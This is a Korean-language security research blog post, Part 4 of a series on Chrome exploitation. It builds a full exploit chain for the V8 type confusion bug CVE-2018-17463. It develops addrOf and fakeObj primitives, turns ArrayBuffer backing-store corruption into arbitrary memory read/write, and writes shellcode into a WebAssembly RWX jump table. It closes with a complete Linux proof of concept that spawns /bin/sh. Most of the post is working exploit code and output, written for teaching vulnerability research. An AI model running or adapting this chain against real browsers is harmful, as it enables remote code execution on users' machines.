---
title: "[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 4.(KR)"
author: OUYA77
tags: [CVE-2018-17463, Chrome, Chromium, Heap Sandbox, OUYA77, RCE, Type Confusion, pwnable]
categories: [Research]
date: 2025-10-10 17:00:00
cc: true
index_img: /2025/10/10/OUYA77/Chrome_part4/kr/TypeConfusion101_Part4.jpg
---

안녕하세요 OUYA77 입니다. 다들 추석 잘 보내셨나요?

지난 시간에 분량 조절 실패로 Read/Write primitive 만 얻고 끝났는데, 이번 시간에는 RCE 까지 한번 가보겠습니다. 그래서 이번 포스트에서는 CVE-2018-17463에서 남은 exploit에 대한 내용과 Heap Sandbox 에 대해서 알아보도록 하겠습니다.

> 지난 게시글 보기
→ [[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆ Part 1.](https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/) 
→ [[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆ Part 2.](https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/) 
→ [[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆ Part 3.](https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/)
> 

## 0. Recap

Part 3에서 Type Confusion을 이용해 겹치는 속성 쌍을 찾고 포인터 객체가 double로 해석되어서 double 타입을 읽고 쓸 때, 포인터 값이 편함을 통해서 Read/Write Primitive를 얻었습니다.

- The addrOf Read Primitive

```jsx
function addrOf() {
    // 1. vuln 함수 동적 생성 (Map 검사 우회)
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      // p1을 Double로 예상하지만, 실제 p2인 Object 포인터가 로드됨
      return obj.p${p1}.x; 
    }
  `);

    let obj = {z: 1234}; // 주소를 알고자 하는 대상 객체
    let pValues = [];
    pValues[p1] = {x: 13.37}; // Double (예상 타입)
    pValues[p2] = {y: obj}; // Object (실제 로드되는 값)

    // 2. JIT 최적화 및 Type Confusion 유도
    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        // 반환 값이 13.37이 아니면 (즉, 주소가 유출되면) 성공
        if (res != 13.37) {
            return res.toBigInt() - 1n; // 주소 반환 및 태그 제거
        }
    }
    throw "[!] AddrOf Primitive Failed"
}
```

- The fakeObj Write Primitive

```jsx
function fakeObj() {
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let orig = obj.p${p1}.x;
      // Overwrite property x of p1, but due to type confusion
      // we overwrite property y of p2
      obj.p${p1}.x = 0x41414141n;
      return orig;
    }
  `);

    let obj = {z: 1234};
    let pValues = [];
    pValues[p1] = {x: 13.37};
    pValues[p2] = {y: obj};

    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        if (res != 13.37) {
            return res;
        }
    }
}
```

이제 주소를 leak할 수 있는 read primitive와 객체의 주소를 쓸 수 있는 write primitive를 얻었으니, 이를 exploit을 위해 임의 메모리 읽기/쓰기(AAR/AAW) primitive로 정교하게 다듬어 보며 RCE를 해보도록 하겠습니다.

# 1. CVE-2018-17463 (cont’d) - For RCE

## 1.1 Relative R/W → AAR/W

### Concept)

현재의 읽기/쓰기 프리미티브는 다른 객체의 속성 값(포인터)을 덮어쓸 수 있지만, 이는 직접적으로 원하는 임의의 메모리 주소에 읽고 쓰는 데는 유용하지 않습니다.

문제는 **V8 엔진의 객체 관리 방식**에 있습니다. 우리가 Type Confusion을 이용해 메모리 주소(e.g., `0x41414141`)를 덮어쓰더라도, V8은 덮어쓴 그 주소를 여전히 **유효한 JavaScript 객체 포인터**로 취급합니다. 따라서, 우리가 쉘코드를 넣을 메모리 주소를 포인터에 쓴다 해도, V8은 이 주소로 이동한 다음 객체의 내부 구조(e.g., 오프셋 8의 `backing store` 포인터)에 접근하려 시도합니다. 이 과정은 V8이 예상했던 객체 구조를 찾지 못해 크래시를 유발하거나 데이터 조작에 실패하게 만듭니다.

따라서 진정한 임의 주소 읽기/쓰기(AAR/AAW)를 확보하기 위해서는 객체 속성이 아니라 **V8이 실제 메모리 버퍼를 관리하는 내부 필드**를 덮어써야 합니다. 이때 자주 활용되는 도구가 바로 **`ArrayBuffer`** 객체입니다. `ArrayBuffer`는 고정된 크기의 바이너리 데이터를 저장하기 위한 버퍼를 나타내며, 일반 객체와 달리 데이터 타입 변환 없이 메모리를 직접 다룰 수 있습니다. 이 객체의 내부 필드 중 하나인 **backing_store 포인터**는 실제 데이터가 위치한 메모리 주소를 가리키고 있습니다.

`ArrayBuffer`의 `backing_store`는 `TypedArray`가 데이터를 읽고 쓰는 기준이 되므로, 이 포인터를 제어하는 것이 핵심입니다. 만약 우리가 이 값을 임의의 주소로 덮어쓰게 된다면, V8은 이를 객체 포인터로 검증하지 않고 단순히 버퍼 시작 주소로 간주합니다. 즉, 기존의 Relative R/W가 단순히 객체 접근 로직을 오작동시키는 방식이었다면, `backing_store` 조작은 **순수 메모리 주소(Raw Pointer)를 직접 제어**하는 방식이므로 훨씬 강력합니다.

다만 `ArrayBuffer` 자체로는 데이터를 직접 읽고 쓸 수 없습니다. 대신 `TypedArray`나 `DataView`를 통해 원하는 형식(e.g., 부동소수점, 64비트 정수 등)으로 접근할 수 있습니다. 결과적으로 우리는 제한적인 Relative R/W 프리미티브를 이용해 `backing_store` 포인터를 덮어쓰고, `TypedArray`를 통해 원하는 임의의 메모리 주소를 자유롭게 읽고 쓰는 완전한 AAR/AAW 권한을 확보할 수 있습니다.

### Exploitation)

그럼 이 컨셉을 실제로 어떻게 구현하는지 살펴보겠습니다. 다음은 Relative Write primitive에 사용했던 fakeObj 함수입니다.

```jsx
function fakeObj() {
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let orig = obj.p${p1}.x;
      // Overwrite property x of p1, but due to type confusion
      // we overwrite property y of p2
      obj.p${p1}.x = 0x41414141n;
      return orig;
    }
  `);

    let obj = {z: 1234};
    let pValues = [];
    pValues[p1] = {x: 13.37};
    pValues[p2] = {y: obj}
    ...
```

`fakeObj` primitive를 통해 어떻게 이 `backing store` 포인터에 접근하여 덮어쓸 수 있을지 알아보겠습니다. 현재 읽기와 쓰기 프리미티브 모두에서 우리는 `p1`에 대해 하나의 인라인 프로퍼티를 가진 객체를 만들고, `p2`에 대해서도 하나의 인라인 프로퍼티를 가진 객체를 생성합니다.

`vuln` 함수에서는 `p1` 객체의 프로퍼티 `x`를 덮어쓰려고 시도합니다. 이 동작은 `p1`의 객체 주소를 역참조하여 오프셋 24를 접근하고, 그곳에 인라인으로 저장된 `x` 프로퍼티 값을 읽거나 쓰게 됩니다. 그러나 Type confusion으로 인해, 실제로는 이 연산이 `p2`의 객체 주소를 역참조하여 오프셋 24를 접근하게 되고, 그 위치에 인라인으로 저장된 `y` 프로퍼티 값을 조작하게 됩니다. 결과적으로 우리는 `obj` 객체의 주소를 덮어쓸 수 있게 됩니다.

아래 그림은 이를 시각적으로 나타낸 것입니다.

![출처: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)](image.png)

출처: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)

ArrayBuffer의 백킹 스토어 포인터는 오프셋 32에 위치합니다. 따라서 `x2`와 같은 또 다른 인라인 프로퍼티를 생성하면, `fakeObj` 프리미티브를 통해 해당 백킹 스토어 포인터에 접근하고 이를 덮어쓸 수 있습니다. 다음의 그림을 봅시다.

![image.png](image%201.png)

이제 ArrayBuffer의 Backing Store Pointer를 덮어씀으로써 AAR/W primitive를 획득할 수 있게 되었습니다. 하지만 여기서 약간의 문제가 있습니다. 가령, 여러 메모리 위치에서 읽기 및 쓰기를 해야 한다고 가정해봅시다. 이 경우 우리는 계속해서 버그를 트리거하고 `fakeObj` 프리미티브를 통해 배열 버퍼의 백킹 스토어를 덮어써야 합니다. 이는 매우 번거로운 과정이므로 좀 더 유용한 기법이 필요합니다.

이를 위해, Array Buffer 객체를 하나가 아닌 **두 개**를 사용할 수 있습니다. 먼저 첫 번째 Array Buffer의 백킹 스토어 포인터를 손상시켜 두 번째 배열 버퍼 객체의 주소를 가리키도록 만듭니다. 그 다음, 첫 번째 Array Buffer의 `TypedArray` view를 이용해 다섯 번째 객체 프로퍼티(네 번째 인덱스, 즉 `view1[4]`)에 값을 써줍니다. 이 과정은 두 번째 배열 버퍼의 백킹 스토어 포인터를 덮어씌우게 됩니다. 이후 두 번째 배열 버퍼의 `TypedArray` view를 이용하면 원하는 메모리 영역에 자유롭게 데이터를 읽거나 쓸 수 있습니다.

이와 같이 두 개의 배열 버퍼를 함께 사용하면, V8 힙 내 임의의 위치에 대해 빠르게 읽고 쓸 수 있는 또 다른 익스플로잇 프리미티브를 만들 수 있습니다. 아래 예시는 메모리에서 이 구조를 설명합니다.

![image.png](image%202.png)

### Coding)

코드 부분을 봅시다. 앞에서는 덮어쓰는 값을 하드코딩했는데, 이제는 전달 받은 인자로 값을 쓰도록 수정해줍니다. 또한, `p1` 객체를 두 개의 인라인 프로퍼티를 가진 형태로 수정해야 합니다. 그 이유는 두 번째 인라인 프로퍼티가 배열 버퍼의 백킹 스토어 포인터와 겹치기 때문입니다. 따라서 `vuln` 함수 역시 두 번째 인라인 프로퍼티에 접근하여 백킹 스토어 포인터를 덮어쓸 수 있도록 수정해야 합니다.

그리고 주소나 데이터를 float 타입으로 바꾸기 위해서 toNumber 함수를 추가합니다. 이는 Type Confusion 시 부동소수값을 주소값으로 해석하기 때문입니다.

최종적으로 완성된 `fakeObj` 프리미티브는 다음과 같습니다.

```jsx
BigInt.prototype.toNumber = function toNumber() {
    uint64View[0] = this;
    return floatView[0];
};

function fakeObj(obj, newValue) {
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      // Write to Backing Store Pointer via Property x2
      let orig = obj.p${p1}.x2;
      obj.p${p1}.x2 = ${newValue.toNumber()};
      return orig;
    }
  `);

    let pValues = [];
    // x2 Property Overlaps Backing Store Pointer for Array Buffer
    let o = {x1: 13.37, x2: 13.38};
    pValues[p1] = o;
    pValues[p2] = obj;

    for (let i = 0; i < 10000; i++) {
        // Force Map Check and Redundancy Elimination
        o.x2 = 13.38;
        let res = vuln(makeObj(pValues));
        if (res != 13.38) {
            return res.toBigInt();
        }
    }
    throw "[!] fakeObj Primitive Failed"
}

```

이제 `fakeObj` 프리미티브에서 두 개의 인라인 프로퍼티를 사용하는 이유와 동일하게 `addrOf` 프리미티브 역시 수정해야 합니다. 수정된 코드는 다음과 같습니다.

```jsx
function addrOf(obj) {
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      // Trigger our type-confusion by accessing an out-of-bound property
      // This will load p1 from our object thinking it's a Double, but instead
      // due to overlap, it will load p2 which is an Object
      return obj.p${p1}.x2;
    }
  `);

    let pValues = [];
    // x2 Property Overlaps Backing Store Pointer for Array Buffer
    pValues[p1] = {x1: 13.37, x2: 13.38};
    pValues[p2] = {y: obj};

    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        if (res != 13.37) {
            // Subtract 1n from address due to pointer tagging.
            return res.toBigInt() - 1n;
        }
    }
    throw "[!] AddrOf Primitive Failed"
}

```

---

이제 익스플로잇 스크립트를 수정했으므로, 배열 버퍼의 백킹 스토어 포인터를 덮어쓸 수 있어야 합니다. 이를 테스트해보겠습니다. 우선 1024바이트 크기의 새로운 배열 버퍼를 만들고, 그 주소를 leak한 뒤 백킹 스토어 포인터를 `0x41414141`로 덮어씌워 보겠습니다.

코드 내에 `%DebugPrint`를 추가하여 유출된 주소가 실제 배열 버퍼 객체의 주소와 일치하는지, 그리고 백킹 스토어 포인터가 성공적으로 덮어써졌는지를 검증합니다.

수정된 스크립트의 마지막 부분은 다음과 같습니다.

```jsx
print("[+] Finding Overlapping Properties...");
findOverlappingProperties();
print(`[+] Properties p${p1} and p${p2} overlap!`);

// Create Array Buffer
let arrBuf1 = new ArrayBuffer(1024);

print("[+] Leaking ArrayBuffer Address...");
let arrBuf1fAddr = addrOf(arrBuf1);
print(`[+] ArrayBuffer Address: 0x${arrBuf1fAddr.toString(16)}`);
%DebugPrint(arrBuf1)

print("[+] Corrupting ArrayBuffer Backing Store Address...")
// Overwrite Backing Store Pointer with 0x41414141
let ret = fakeObj(arrBuf1, 0x41414141n);
print(`[+] Original Leaked Data: 0x${ret.toString(16)}`);
%DebugPrint(arrBuf1)
```

실행 결과는 다음과 같습니다.

```
[+] Finding Overlapping Properties...
[+] Properties p15 and p11 overlap!
[+] Leaking ArrayBuffer Address...
[+] ArrayBuffer Address: 0x2a164919360
...
[+] Corrupting ArrayBuffer Backing Store Address...
[+] Original Leaked Data: 0x1aeda203210
DebugPrint: ...
 - backing_store: 0000000041414141
...

```

---

이제 백킹 스토어 포인터를 덮어쓸 수 있으므로, 두 개의 ArrayBuffer를 사용하여 다음과 같이 메모리 읽기/쓰기 프리미티브를 구축할 수 있습니다. 

```jsx
let memory = {
    read64(addr) {
        view1[4] = addr;
        let view2 = new BigUint64Array(arrBuf2);
        return view2[0];
    },
    write64(addr, ptr) {
        view1[4] = addr;
        let view2 = new BigUint64Array(arrBuf2);
        view2[0] = ptr;
    }
};
```

Type Confusion을 이용해서 처음에는 Overlapping 되는 bug를 이용해 Relative R/W를 얻을 수 있었고 Array Buffer 2개를 이용해 이를 Arbitary Address R/W로 바꿀 수 있었습니다. 이제 Code를 Execution 하러 가보시죠!

## 1.2 AAR/W → RCE

### Toward Gaining Code Execution

AAR/W를 얻었으니 이제 코드를 실행시키면 되는데, 안타깝게도.. 단순히 V8 힙 영역이나 ArrayBuffer에 셸코드를 써 넣고 실행할 수는 없습니다. 왜냐하면 DEP(Data Execution Prevention)가 활성화되어 있기 때문입니다. 그래서 대안으로는 JIT 메모리 영역을 목표로 삼는 방법이 있습니다. 

자바스크립트 코드가 JIT 컴파일될 때, 컴파일러는 기계어 명령어를 메모리 페이지에 기록하고 이를 실행해야 하므로 보통 해당 메모리 페이지에는 RWX(Read-Write-Execute) 권한이 부여됩니다. 따라서 공격자는 JIT 컴파일된 함수의 포인터를 유출한 뒤, 해당 주소에 셸코드를 덮어쓰고 함수를 호출하여 악성 코드를 실행할 수 있습니다.

*그러나* 2018년 이후 V8 팀은 `write_protect_code_memory` 보호 기법을 도입하였습니다. 이 기능은 JIT 메모리 페이지의 권한을 실행 시점에는 RX(Read-Execute) 로, 쓰기 시점에는 RW(Read-Write) 로 전환합니다. 따라서 단순히 RWX 메모리로 취급하고 공격하는 것이 불가능해졌습니다. 하지만 다른 pwnable 문제처럼 이를 우회하는 대표적인 방법은 ROP(Return Oriented Programming) 기법을 뽑을 수 있습니다. ROP를 사용하면 가상 함수 테이블(vtable)이나 JIT 함수 포인터, 스택을 조작하여 Code Execution을 할 수 있습니다. 

ROP 체인을 구성하는 것은 상당히 복잡한 작업입니다. 그렇기에 좀 더 단순하고 효율적인 **WebAssembly (wasm)**를 통해 exploit을 해보겠습니다.

### WebAssembly 기본 원리

WebAssembly는 브라우저 환경에서 저수준 언어를 실행하기 위해 설계된 바이너리 포맷 언어입니다. 주로 C/C++과 같은 언어를 브라우저에서 실행할 때 활용되며, 자바스크립트와 상호작용이 가능합니다.

V8 엔진은 wasm 코드를 처음부터 최적화된 형태로 JIT 컴파일하지 않고, 먼저 **Liftoff**라는 베이스라인 컴파일러로 1차 컴파일을 수행합니다. wasm 또한 JIT 메모리를 사용하므로 RWX 권한이 부여된 메모리 페이지에 기계어 코드가 기록됩니다. 특히 asm.js와의 호환성 문제 때문에 wasm에 대한 write-protect 플래그는 기본적으로 꺼져 있습니다. 따라서 wasm은 익스플로잇에서 매우 유용한 도구가 됩니다.

V8에서 wasm 모듈이 인스턴스화되면, 함수 호출은 **Jump Table**을 통해 이루어집니다. Jump Table은 각 함수 슬롯이 해당 함수의 실제 기계어 코드 포인터(WasmCode 객체)를 가리키도록 구성되어 있습니다. 이 포인터는 RWX 메모리 주소를 포함하므로 공격자는 이를 덮어씌워 임의의 코드를 실행할 수 있었습니다. (2018년 당시 V8 힙의 점프 테이블은 읽기/쓰기 및 실행이 가능하여 코드 하이재킹에 용이했는데 지금은 아닙니다..ㅜ.ㅜ)

### addrOf 함수 re-building

이제 우리가 만든 read/write primitive를 활용해 wasm 인스턴스 객체의 주소와 RWX 점프 테이블 포인터를 leak할 수 있습니다. 다만 기존 addrOf primitive는 프로퍼티를 overlapping해서 덮어써야 해서 다른 기능을 망가뜨릴 수 있으므로, 새로운 방법이 필요합니다. 이를 위해 ArrayBuffer에 **out-of-line property** 를 추가하고 객체를 참조시킨 뒤, 프로퍼티 배열의 오프셋을 읽어 객체 주소를 유출하는 방식을 사용합니다. 이 기법을 통해 새로운 `addrOf` 구현을 완성할 수 있습니다.

> 이유_
ArrayBuffer는 자체적으로 raw 바이트 버퍼를 관리하며, 인라인 프로퍼티와 별도로 **프로퍼티 저장소(property store)** 를 가집니다. 이 프로퍼티 저장소에 out-of-line 방식으로 객체를 할당하면, 그 저장소 내부에 객체에 대한 포인터가 보관됩니다. 이미 확보한 메모리 읽기 프리미티브를 통해 이 프로퍼티 저장소의 메타데이터를 분석하면, 해당 포인터를 간접적으로 획득할 수 있습니다. 즉, 직접 객체 필드를 덮어쓰지 않고도 객체의 주소를 유출할 수 있게 됩니다.
> 

```jsx
let memory = {
  addrOf(obj) {
    // Set object address to new out-of-line property called leakme
    arrBuf2.leakMe = obj;
    // Use read64 primitive to leak the properties backing store address of our array buffer
    let props = this.read64(arrBuf2Addr + 8n) - 1n;
    // Read offset 16 from the array buffer backing store and return the address of our object
    return this.read64(props + 16n) - 1n;
  }
};
```

이를 이용해서 최종적으로 `wasmInstance` 와 그 인스턴스의 RWX jump table 에 대해서 주소를 얻을 수 있습니다. 

## 1.3. RCE PoC

이제 지금까지의 내용을 합쳐보겠습니다.

### [1] primitive 구축

2번째 ArrayBuffer의 주소를 알아내고(`addOf`) 1번째 버퍼의 backing store pointer를 2번째 ArrayBuffer의 주소로 변경합니다. 그리고 이를 토대로 Memory Read/Write primitive를 만듭니다.

```jsx
// Create Array Buffers
let arrBuf1 = new ArrayBuffer(1024);
let arrBuf2 = new ArrayBuffer(1024);

// Leak Address of arrBuf2
print("[+] Leaking ArrayBuffer Address...");
let arrBuf2Addr = addrOf(arrBuf2);
print(`[+] ArrayBuffer Address @ 0x${arrBuf2Addr.toString(16)}`);

// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2
print("[+] Corrupting ArrayBuffer Backing Store...")
let originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

// Store Original Backing Store Pointer of arrBuf2
let view1 = new BigUint64Array(arrBuf1)
let originalArrBuf2BackingStore = view1[4]

// Construct Memory Primitives via Array Buffers
let memory = {
  write(addr, bytes) {
    view1[4] = addr;
    let view2 = new Uint8Array(arrBuf2);
    view2.set(bytes);
  },
  read64(addr) {
    view1[4] = addr;
    let view2 = new BigUint64Array(arrBuf2);
    return view2[0];
  },
  write64(addr, ptr) {
    view1[4] = addr;
    let view2 = new BigUint64Array(arrBuf2);
    view2[0] = ptr;
  },
  addrOf(obj) {
    arrBuf2.leakMe = obj;
    let props = this.read64(arrBuf2Addr + 8n) - 1n;
    return this.read64(props + 16n) - 1n;
  }
};

print("[+] Constructed Memory Read and Write Primitive!");
```

### [2] WebAssembly 인스턴스를 생성

이 wasm 코드 블록은 간단한 “더미 함수”를 JIT 메모리에 컴파일하기 위한 것입니다. 인스턴스가 생성되면 내부적으로 **RWX 권한을 가진 점프 테이블**이 만들어집니다. 이후에 이 RWX 메모리 위치에 셸코드를 덮어써 실행할 수 있습니다.

```jsx
print("[+] Generating a WebAssembly Instance...");

// Generate RWX region for Shellcode via WASM
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;
```

### [3] RWX 점프 테이블 포인터 주소 획득

앞에서 만든 primitive를 이용해서 wasm 인스턴스의 주소를 획득합니다. 

```jsx
// Leak WebAssembly Instance Address and Jump Table Start Pointer
print("[+] Leaking WebAssembly Instance Address...");
let wasmInstanceAddr = memory.addrOf(wasmInstance);
print(`[+] WebAssembly Instance Address @ 0x${wasmInstanceAddr.toString(16)}`);
let wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xF0n);
print(`[+] WebAssembly RWX Jump Table Address @ 0x${wasmRWXAddr.toString(16)}`);
```

### [4] 쉘코드 삽입

먼저 `wasmInstance` 객체의 주소에 `0xf0` 오프셋을 더해 **점프 테이블 포인터**를 읽어옵니다. `read64`를 통해 해당 RWX 주소를 얻은 뒤, 쉘코드를 그 위치에 작성합니다.

```jsx
// Leak WebAssembly Instance Address and Jump Table Start Pointer
print("[+] Leaking WebAssembly Instance Address...");
let wasmInstanceAddr = memory.addrOf(wasmInstance);
print(`[+] WebAssembly Instance Address @ 0x${wasmInstanceAddr.toString(16)}`);
let wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xF0n);
print(`[+] WebAssembly RWX Jump Table Address @ 0x${wasmRWXAddr.toString(16)}`);

print("[+] Preparing Shellcode...");
// Prepare Calc Shellcode
let shellcode = new Uint8Array([0x48,...

print("[+] Writing Shellcode to Jump Table Address...");
// Write Shellcode to Jump Table Start Address
memory.write(wasmRWXAddr, shellcode);
```

### [5] wasm 함수를 호출하여 셸코드를 실행

마지막 단계는 단순히 `wasm` 함수(`main`)을 호출하는 것입니다. 점프 테이블이 가리키는 주소에는 이미 쉘코드로 바뀌었으므로, 호출과 동시에 셸코드가 실행됩니다.

```jsx
// Execute our Shellcode
print("[+] Popping Calc...");
func();
```

이로써 자바스크립트에서 시작된 취약점이 실제 네이티브 코드 실행으로 이어지게 됩니다.

다음은 위 내용을 반영한 최종적인 poc 코드입니다.

> Part 1. 에서 이야기했다시피 위 실습은 Linux 환경에서 진행하였습니다. 아래는 Linux PoC Code입니다.
> 

```jsx
// Conversion Buffers
let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
    floatView[0] = this;
    return uint64View[0];
};

BigInt.prototype.toNumber = function toNumber() {
    uint64View[0] = this;
    return floatView[0];
};

// Function that creates an object with one in-line and 32 out-of-line properties
function makeObj(pValues) {
    let obj = {
        inline: 1234
    };
    for (let i = 0; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: pValues[i]
        });
    }
    return obj;
}

// Function to find overlapping properties
let p1, p2;
function findOverlappingProperties() {
    let pNames = [];
    for (let i = 0; i < 32; i++) {
        pNames[i] = 'p' + i;
    }

    eval(`
        function vuln(obj) {
            obj.inline;
            this.Object.create(obj);
            ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
            return [${pNames.join(', ')}];
        }
    `);

    let pValues = [];
    for (let i = 1; i < 32; i++) {
        pValues[i] = -i;
    }

    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        for (let i = 1; i < res.length; i++) {
            if (i !== -res[i] && res[i] < 0 && res[i] > -32) {
                [p1, p2] = [i, -res[i]];
                return;
            }
        }
    }
    throw "[!] Failed to find overlapping properties";
}

// Return address of an object as a BigInt
function addrOf(obj) {
    eval(`
        function vuln(obj) {
            obj.inline;
            this.Object.create(obj);
            return obj.p${p1}.x1;
        }
    `);

    let pValues = [];
    pValues[p1] = { x1: 13.37, x2: 13.38 };
    pValues[p2] = { y: obj };

    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        if (res != 13.37) {
            return res.toBigInt() - 1n;
        }
    }
    throw "[!] AddrOf Primitive Failed";
}

// Function to write data to obj address
function fakeObj(obj, newValue) {
    eval(`
        function vuln(obj) {
            obj.inline;
            this.Object.create(obj);
            let orig = obj.p${p1}.x2;
            obj.p${p1}.x2 = ${newValue.toNumber()};
            return orig;
        }
    `);

    let pValues = [];
    let o = { x1: 13.37, x2: 13.38 };
    pValues[p1] = o;
    pValues[p2] = obj;

    for (let i = 0; i < 10000; i++) {
        o.x2 = 13.38;
        let res = vuln(makeObj(pValues));
        if (res != 13.38) {
            return res.toBigInt();
        }
    }
    throw "[!] fakeObj Primitive Failed";
}

// Find Overlapping Properties
print("[+] Finding Overlapping Properties...");
findOverlappingProperties();
print(`[+] Properties p${p1} and p${p2} overlap!`);

// Create Array Buffers
let arrBuf1 = new ArrayBuffer(1024);
let arrBuf2 = new ArrayBuffer(1024);

// Leak Address of arrBuf2
print("[+] Leaking ArrayBuffer Address...");
let arrBuf2Addr = addrOf(arrBuf2);
print(`[+] ArrayBuffer Address @ 0x${arrBuf2Addr.toString(16)}`);

// Corrupt Backing Store Pointer of arrBuf1
print("[+] Corrupting ArrayBuffer Backing Store...");
let originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

// Store Original Backing Store Pointer of arrBuf2
let view1 = new BigUint64Array(arrBuf1);
let originalArrBuf2BackingStore = view1[4];

// Memory Read and Write Primitives
let memory = {
    write(addr, bytes) {
        view1[4] = addr;
        let view2 = new Uint8Array(arrBuf2);
        view2.set(bytes);
    },
    read64(addr) {
        view1[4] = addr;
        let view2 = new BigUint64Array(arrBuf2);
        return view2[0];
    },
    write64(addr, ptr) {
        view1[4] = addr;
        let view2 = new BigUint64Array(arrBuf2);
        view2[0] = ptr;
    },
    addrOf(obj) {
        arrBuf2.leakMe = obj;
        let props = this.read64(arrBuf2Addr + 8n) - 1n;
        return this.read64(props + 16n) - 1n;
    }
};

print("[+] Constructed Memory Read and Write Primitive!");

// Generate RWX region via WASM
print("[+] Generating a WebAssembly Instance...");
var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

// Leak WebAssembly Instance Address and Jump Table
print("[+] Leaking WebAssembly Instance Address...");
let wasmInstanceAddr = memory.addrOf(wasmInstance);
print(`[+] WebAssembly Instance Address @ 0x${wasmInstanceAddr.toString(16)}`);
let wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xF0n);
print(`[+] WebAssembly RWX Jump Table Address @ 0x${wasmRWXAddr.toString(16)}`);

print("[+] Preparing Shellcode...");
// Linux x64 Shellcode to execute /bin/sh
let shellcode = new Uint8Array([
    0x6a, 0x3b,                   // push 59 (syscall number for execve)
    0x58,                         // pop rax
    0x48, 0x31, 0xd2,            // xor rdx, rdx (envp = NULL)
    0x48, 0x31, 0xf6,            // xor rsi, rsi (argv = NULL)
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // movabs rdi, "/bin/sh\x00"
    0x57,                         // push rdi
    0x48, 0x89, 0xe7,            // mov rdi, rsp
    0x0f, 0x05                    // syscall
]);

print("[+] Writing Shellcode to Jump Table Address...");
// Write Shellcode
memory.write(wasmRWXAddr, shellcode);

print("[+] Spawning Shell...");
// Execute Shellcode
func();

```

### 결과

메모리 상에 위치한 Wasm 인스턴스의 점프 테이블에 쉘코드를 작성하는 exploit이므로 윈도우 코드를 리눅스로 포팅하기 위해서는 단순히 쉘코드만 변경해주면 됩니다. 저는 계산기를 띄우는 쉘코드를 shell 을 띄우는 쉘코드로 변경해서 Linux 에서 실행했습니다.

- Windows

![image.png](image%203.png)

- Linux

![image.png](image%204.png)

## 1.4 정리

Part 4.를 달려오고 있는데 긴 호흡이었으니 한번 정리하고 가겠습니다!(뒤에 내용이 더 있거든요 ㅎ.ㅎ)

Part 1에서는 Chrome 내부 구조와 V8을 이해하는 데 필요한 기초 개념을 다루었습니다.

Part 2에서는 Type Confusion의 개념을 설명했습니다. Type Confusion이 발생했을 때 자바스크립트 엔진이 내부 타입을 잘못 해석하는 이유와 그로 인해 발생하는 위험을 정리했습니다.

Part 3 ~ Part 4(중간;지금까지)에서는 Type Confusion으로부터 어떻게 읽기/쓰기 프리미티브로 구축되는지, 그리고 그 프리미티브들이 어떻게 이어져 실제 익스플로잇 체인을 구성하는지를 긴 호흡으로 살펴보았습니다. 

브라우저는 다양한 기능을 위해 여러 프로세스·메모리 구조를 띄워 동작합니다. 이로 인해 공격자는 여러 공격 벡터를 노릴 수 있으며, 그 벡터들을 조합하면 heap 상의 원하는 데이터를 읽고 쓰는 것이 가능해집니다. 이번 연구글에서는 그중 하나인 Type Confusion에 대해 설명하며 이를 이용하여 메모리 상에 데이터를 쓰고, 궁극적으로 원격 코드 실행(RCE)에 도달하는 흐름을 다루었습니다.

사실, 기술적 관점에서 CVE-2018-17463에 대한 exploit은 두 단계로 나누어 생각하는 것이 좋습니다.

